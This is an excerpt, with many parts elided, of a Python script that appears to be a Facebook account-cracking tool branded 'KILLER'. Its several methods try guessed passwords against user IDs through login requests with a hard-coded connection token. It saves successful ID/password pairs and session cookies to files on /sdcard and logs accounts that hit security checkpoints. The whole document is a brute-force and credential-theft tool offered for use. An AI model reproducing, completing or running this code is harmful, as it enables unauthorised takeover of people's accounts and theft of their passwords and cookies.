...
def logo():
	os.system('clear')
	logo = (f'''\033[1;97m
\33[1;34m__  ___  __   __       __       _______ .______         
|  |/  / |  | |  |     |  |     |   ____||   _  \        
|  '  /  |  | |  |     |  |     |  |__   |  |_)  |       
|    <   |  | |  |     |  |     |   __|  |      /        
|  .  \  |  | |  `----.|  `----.|  |____ |  |\  \----.   
...
\33[1;36m---------------------------------------------------
 \33[1;34m Owner     >>    KILLER
 \33[1;97m Github    >>    Killerkhaniihan
 \33[1;32m Tool      >>    non
  \33[1;36mversion   >>    0.0
\33[1;32m--------------------------------------------------''')
	p(logo)
...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KILLER] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/KILLER_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KILLER_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KILLER-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KILLER_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/KILLER_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KILLER_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KILLER-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KILLER_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KILLER %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[KILLER-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/KILLER_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KILLER_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KILLER-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KILLER_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [KILLER] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[KILLER-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/KILLER_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KILLER_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KANO-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KILLER_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[KILLER-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/KILLER_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/KILLER_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[KILLER-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/KILLER_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
